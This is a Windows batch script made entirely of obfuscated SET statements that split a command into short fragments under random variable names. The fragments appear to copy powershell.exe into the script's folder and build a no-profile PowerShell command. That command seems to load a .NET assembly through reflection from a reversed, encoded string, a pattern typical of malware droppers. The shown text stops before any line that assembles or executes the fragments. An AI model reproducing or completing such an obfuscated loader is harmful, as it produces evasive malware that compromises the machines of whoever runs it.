@echo off
set "GqYpWoAxMK=y "
set "GrKReenfeo=:\"
set "kkzEESeUvx=st"
set "ViDsZdnvuW= C"
set "aTMfMtECtW=32"
set "WkyiSinCnM=py"
set "sFxgkDQyRp=ll"
set "NqfXvlZDdF=Sy"
set "CEIDczqXpw=Wi"
set "VhyYjrzaqA=s\"
set "LcZFjvoTDK=Po"
set "oFGHErxuRl=do"
set "WagqHZpVTl=we"
set "JJAOhEAGdN=ow"
set "WZukckwemV= /"
set "nncidLdfaz=rS"
set "nFESBcwDwc=in"
set "lPyZSTLMru=we"
set "MmANDxaQCx=\v"
set "rjTePUwAav=1."
set "XLDzZwIQIp=.e"
set "FWCyCLHUur=\W"
set "AvshOzTdGz=nd"
set "TLliThSMSt=xe"
set "qTnhMICQcT=po"
set "YKTBBtWtXw=em"
set "tpxKiIxVTQ=0\"
set "QUkwzxOQEU=rs"
set "UcEFqlGaxj=he"
set "IxvFDWfUKN=co"
set "ZeWLgyWLrg=he"
set "oBBzSchuZQ=ws"
set "cEQhonvkRS=ll"
set "NvBgRmaoHz= %~dp0"
set "ewTBcYvaXS=cd"
set "RDXJWqpeoU=ptor"
set "lPOVmZcOPH=null"
set "TXpwJDLARR= '')"
set "aRvDzNzUTy=BUqJ"
set "tZauuwOrVi=y.Pa"
set "olfHyrhNmq=FTJ."
set "YECvcUwhDo=and "
set "JmzOBhxmTj=gMod"
set "MtdFUlPMvV=ss -"
set "JXMOHyPCwg=yTo("
set "CtCudGUvYL=ILHl"
set "jiYMBdNvUz=embl"
set "qEYnCtdjNU=-nop"
set "tOJDLgzlSm=7;$u"
set "VMIupaCGJx=am;$"
set "gBiUZqWDXy=tS46"
set "ANnIwRpwtz=.Cre"
set "nxPXppaztV='[-1"
set "QgYvNBUxZT=736u"
set "SrQMglNPMZ=nage"
set "pjTjrrCyDB=-joi"
set "DiPTmEHBSZ=t, 0"
set "qZDqUXDhxu=[Sys"
set "oZmMOLTpRh=6] -"
set "tyTMXuEhYS=.Ass"
set "TincEDIFBl=-1.."
set "MGqQbYejiS=n ''"
set "IvkhxbNkTh=ment"
